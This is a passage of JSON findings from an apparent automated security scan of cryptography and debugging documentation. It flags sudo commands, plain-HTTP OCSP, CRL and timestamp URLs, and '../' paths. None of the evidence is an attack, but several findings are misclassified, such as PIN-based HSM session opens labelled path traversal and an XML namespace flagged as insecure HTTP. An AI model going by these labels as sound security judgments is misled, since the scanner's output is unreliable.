        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1102,
        "issue": "Privilege escalation",
        "evidence": "sudo cryptsetup luksAddKey /dev/sdb1 /root/keyfile",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1105,
        "issue": "Privilege escalation",
        "evidence": "sudo cryptsetup luksOpen /dev/sdb1 encrypted_disk --key-file /root/keyfile",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1117,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get install ecryptfs-utils",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1121,
        "issue": "Privilege escalation",
        "evidence": "sudo mount -t ecryptfs ~/Private ~/Private",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1180,
        "issue": "Privilege escalation",
        "evidence": "sudo fdesetup enable",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1183,
        "issue": "Privilege escalation",
        "evidence": "sudo fdesetup status",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1186,
        "issue": "Privilege escalation",
        "evidence": "sudo fdesetup list",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/key-management/resources/REFERENCE.md",
        "line_number": 2033,
        "issue": "Privilege escalation",
        "evidence": "sudo yum install -y aws-cloudhsmv2-cli",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/key-management/resources/REFERENCE.md",
        "line_number": 2057,
        "issue": "User-controlled file path",
        "evidence": "with slot.open(user_pin='crypto-user:password') as session:",
        "recommendation": "Validate path is within allowed directory"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 707,
        "issue": "Privilege escalation",
        "evidence": "sudo yum install -y ./cloudhsm-client-latest.el7.x86_64.rpm",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 710,
        "issue": "Privilege escalation",
        "evidence": "sudo /opt/cloudhsm/bin/configure -a <cluster-HSM-IP>",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 713,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl start cloudhsm-client",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 796,
        "issue": "Privilege escalation",
        "evidence": "sudo dpkg -i yubihsm2-sdk/*.deb",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 799,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl start yubihsm-connector",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 800,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl enable yubihsm-connector",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 843,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get install softhsm2",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 846,
        "issue": "Privilege escalation",
        "evidence": "sudo yum install softhsm",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 856,
        "issue": "Privilege escalation",
        "evidence": "sudo make install",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 1978,
        "issue": "Unencrypted HTTP",
        "evidence": "signtool sign /f \"pkcs11:object=CodeSigningKey\" /fd SHA256 /tr http://timestamp.digicert.com application.exe",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
        "line_number": 51,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl start yubihsm-connector",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
        "line_number": 227,
        "issue": "Privilege escalation",
        "evidence": "sudo yum install -y ./cloudhsm-client-latest.el7.x86_64.rpm",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
        "line_number": 230,
        "issue": "Privilege escalation",
        "evidence": "sudo /opt/cloudhsm/bin/configure -a <cluster-ip>",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
        "line_number": 233,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl start cloudhsm-client",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
        "line_number": 241,
        "issue": "Privilege escalation",
        "evidence": "sudo dpkg -i yubihsm2-sdk/*.deb",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
        "line_number": 244,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl start yubihsm-connector",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
        "line_number": 373,
        "issue": "Unencrypted HTTP",
        "evidence": "- [PKCS#11 Specification](http://docs.oasis-open.org/pkcs11/pkcs11-base/v2.40/pkcs11-base-v2.40.html)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 203,
        "issue": "Unencrypted HTTP",
        "evidence": "- OCSP: http://ocsp.letsencrypt.org",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 204,
        "issue": "Unencrypted HTTP",
        "evidence": "- CA Issuers: http://cert.letsencrypt.org/letsencryptauthorityx3.der",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 209,
        "issue": "Unencrypted HTTP",
        "evidence": "URI: http://crl.example.com/crl.pem",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 787,
        "issue": "Privilege escalation",
        "evidence": "sudo apt install certbot python3-certbot-nginx",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 790,
        "issue": "Privilege escalation",
        "evidence": "sudo yum install certbot python3-certbot-nginx",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 829,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl enable certbot-renew.timer",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 830,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl start certbot-renew.timer",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 894,
        "issue": "Force flag usage",
        "evidence": "acme.sh --renew -d example.com --force",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 1194,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 1352,
        "issue": "Unencrypted HTTP",
        "evidence": "wget http://crl.example.com/crl.pem",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 1387,
        "issue": "Unencrypted HTTP",
        "evidence": "-url http://ocsp.letsencrypt.org -resp_text",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 1882,
        "issue": "Force flag usage",
        "evidence": "certbot renew --force-renewal --cert-name example.com",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 364,
        "issue": "Unencrypted HTTP",
        "evidence": "signtool sign /f certificate.pfx /p password /t http://timestamp.digicert.com myapp.exe",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 1291,
        "issue": "Unencrypted HTTP",
        "evidence": "/t http://timestamp.digicert.com `",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 1299,
        "issue": "Unencrypted HTTP",
        "evidence": "/t http://timestamp.digicert.com `",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 1304,
        "issue": "Unencrypted HTTP",
        "evidence": "signtool sign /f cert.pfx /p password /t http://timestamp.digicert.com /fd SHA1 myapp.exe",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 1305,
        "issue": "Unencrypted HTTP",
        "evidence": "signtool sign /f cert.pfx /p password /tr http://timestamp.digicert.com /fd SHA256 /as myapp.exe",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 1523,
        "issue": "Unencrypted HTTP",
        "evidence": "- **Sectigo**: http://timestamp.sectigo.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 1524,
        "issue": "Unencrypted HTTP",
        "evidence": "- **GlobalSign**: http://timestamp.globalsign.com/tsa/r6advanced1",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 1705,
        "issue": "User-controlled file path",
        "evidence": "with token.open(user_pin='1234') as session:",
        "recommendation": "Validate path is within allowed directory"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 1801,
        "issue": "User-controlled file path",
        "evidence": "session = self.token.open(user_pin=hsm_config['pin'])",
        "recommendation": "Validate path is within allowed directory"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 2002,
        "issue": "Unencrypted HTTP",
        "evidence": "<Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\">",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 2669,
        "issue": "User-controlled file path",
        "evidence": "session = token.open(user_pin=pin)",
        "recommendation": "Validate path is within allowed directory"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 2833,
        "issue": "Unencrypted HTTP",
        "evidence": "signtool sign /f cert.pfx /p password /t http://timestamp.digicert.com /fd SHA256 app.exe",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 2849,
        "issue": "Unencrypted HTTP",
        "evidence": "- Sectigo: http://timestamp.sectigo.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 2903,
        "issue": "Unencrypted HTTP",
        "evidence": "- **PKCS#11 Specification**: http://docs.oasis-open.org/pkcs11/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 226,
        "issue": "Unencrypted HTTP",
        "evidence": "crlDistributionPoints = URI:http://crl.example.com/root.crl",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 227,
        "issue": "Unencrypted HTTP",
        "evidence": "authorityInfoAccess = OCSP;URI:http://ocsp.example.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 284,
        "issue": "Unencrypted HTTP",
        "evidence": "OCSP - URI:http://ocsp.example.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 285,
        "issue": "Unencrypted HTTP",
        "evidence": "CA Issuers - URI:http://ca.example.com/intermediate.crt",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 288,
        "issue": "Unencrypted HTTP",
        "evidence": "URI:http://crl.example.com/intermediate.crl",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 368,
        "issue": "Unencrypted HTTP",
        "evidence": "OCSP - URI:http://ocsp.example.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 369,
        "issue": "Unencrypted HTTP",
        "evidence": "CA Issuers - URI:http://ca.example.com/intermediate.crt",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 374,
        "issue": "Unencrypted HTTP",
        "evidence": "URI:http://crl.example.com/intermediate.crl",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 488,
        "issue": "Unencrypted HTTP",
        "evidence": "authorityInfoAccess = OCSP;URI:http://ocsp.example.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 489,
        "issue": "Unencrypted HTTP",
        "evidence": "crlDistributionPoints = URI:http://crl.example.com/intermediate.crl",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 752,
        "issue": "Unencrypted HTTP",
        "evidence": "http://crl.example.com/intermediate.crl",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 760,
        "issue": "Unencrypted HTTP",
        "evidence": "URI:http://crl.example.com/intermediate.crl",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 822,
        "issue": "Unencrypted HTTP",
        "evidence": "-url http://ocsp.example.com \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 1160,
        "issue": "Path traversal pattern",
        "evidence": "cd ../intermediate",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 1169,
        "issue": "Path traversal pattern",
        "evidence": "cd ../root",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 1172,
        "issue": "Path traversal pattern",
        "evidence": "-in ../intermediate/csr/intermediate.csr \\",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 1173,
        "issue": "Path traversal pattern",
        "evidence": "-out ../intermediate/certs/intermediate-cert.pem",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 1176,
        "issue": "Path traversal pattern",
        "evidence": "cat ../intermediate/certs/intermediate-cert.pem \\",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 1177,
        "issue": "Path traversal pattern",
        "evidence": "certs/ca-cert.pem > ../intermediate/certs/ca-chain.pem",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 1180,
        "issue": "Path traversal pattern",
        "evidence": "cd ../intermediate",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 1782,
        "issue": "Unencrypted HTTP",
        "evidence": "issuing_certificates=\"http://vault.example.com:8200/v1/pki/ca\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 1783,
        "issue": "Unencrypted HTTP",
        "evidence": "crl_distribution_points=\"http://vault.example.com:8200/v1/pki/crl\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 2165,
        "issue": "Unencrypted HTTP",
        "evidence": "curl -I http://crl.example.com/intermediate.crl",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 2168,
        "issue": "Unencrypted HTTP",
        "evidence": "openssl ocsp -issuer ca.pem -cert cert.pem -url http://ocsp.example.com -CAfile ca.pem",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 2376,
        "issue": "Unencrypted HTTP",
        "evidence": "openssl ocsp -issuer ca.pem -cert cert.pem -url http://ocsp.example.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/secrets-rotation/resources/examples/07_emergency_rotation_runbook.md",
        "line_number": 383,
        "issue": "Unencrypted HTTP",
        "evidence": "curl -s http://prometheus:9090/api/v1/query?query='up{job=\"myapp\"}' | jq '.data.result[].value[1]'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/tls-configuration/resources/REFERENCE.md",
        "line_number": 751,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/README.md",
        "line_number": 309,
        "issue": "Path traversal pattern",
        "evidence": "- `../REFERENCE.md` - Detailed TLS specifications and RFCs",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/README.md",
        "line_number": 310,
        "issue": "Path traversal pattern",
        "evidence": "- `../examples/` - Example configurations",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/README.md",
        "line_number": 311,
        "issue": "Path traversal pattern",
        "evidence": "- Main skill: `../../tls-configuration.md`",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/debugging/distributed-systems-debugging.md",
        "line_number": 122,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://inventory-service/api/reserve\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/debugging/distributed-systems-debugging.md",
        "line_number": 140,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://payment-service/api/charge\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/debugging/distributed-systems-debugging.md",
        "line_number": 148,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://inventory-service/api/release\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/distributed-systems-debugging.md",
        "line_number": 583,
        "issue": "Privilege escalation",
        "evidence": "sudo ntpdate pool.ntp.org",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/distributed-systems-debugging.md",
        "line_number": 586,
        "issue": "Privilege escalation",
        "evidence": "sudo timedatectl set-ntp true",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/debugging/distributed-systems-debugging.md",
        "line_number": 763,
        "issue": "Unencrypted HTTP",
        "evidence": "requests.get(\"http://service-b/api/data\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/debugging/distributed-systems-debugging.md",
        "line_number": 768,
        "issue": "Unencrypted HTTP",
        "evidence": "requests.get(\"http://service-b/api/data\", headers=headers)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/core-dump-analysis.md",
        "line_number": 130,
        "issue": "Privilege escalation",
        "evidence": "sudo mkdir -p /etc/systemd/system.conf.d/",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/core-dump-analysis.md",
        "line_number": 131,
        "issue": "Privilege escalation",
        "evidence": "cat <<EOF | sudo tee /etc/systemd/system.conf.d/coredump.conf",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/core-dump-analysis.md",
        "line_number": 136,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl daemon-reexec",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/core-dump-analysis.md",
        "line_number": 139,
        "issue": "Privilege escalation",
        "evidence": "echo '/var/crash/core.%e.%p.%t' | sudo tee /proc/sys/kernel/core_pattern",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/core-dump-analysis.md",
        "line_number": 331,
        "issue": "Privilege escalation",
        "evidence": "sudo pystack remote --pid 12345",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/core-dump-analysis.md",
        "line_number": 631,
        "issue": "Privilege escalation",
        "evidence": "echo '/var/crash/core.%e.%p.%t' | sudo tee /proc/sys/kernel/core_pattern",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/crash-debugging.md",
        "line_number": 321,
        "issue": "Privilege escalation",
        "evidence": "sudo make install",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/debugging/production-debugging.md",
        "line_number": 247,
        "issue": "Unencrypted HTTP",
        "evidence": "curl -X POST http://api.example.com/admin/log-level \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/debugging/production-debugging.md",
        "line_number": 253,
        "issue": "Unencrypted HTTP",
        "evidence": "curl -X POST http://api.example.com/admin/log-level \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/gdb-fundamentals.md",
        "line_number": 534,
        "issue": "Privilege escalation",
        "evidence": "sudo sysctl -w kernel.core_pattern=/tmp/core.%e.%p",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/lldb-macos-debugging.md",
        "line_number": 694,
        "issue": "Privilege escalation",
        "evidence": "sudo sysctl -w kern.corefile=/tmp/core.%P",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/debugging/container-debugging.md",
        "line_number": 360,
        "issue": "Unencrypted HTTP",
        "evidence": "kubectl exec -it <pod_name> -- wget -O- http://service-name:8080/health",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 154,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i eth0",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 157,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
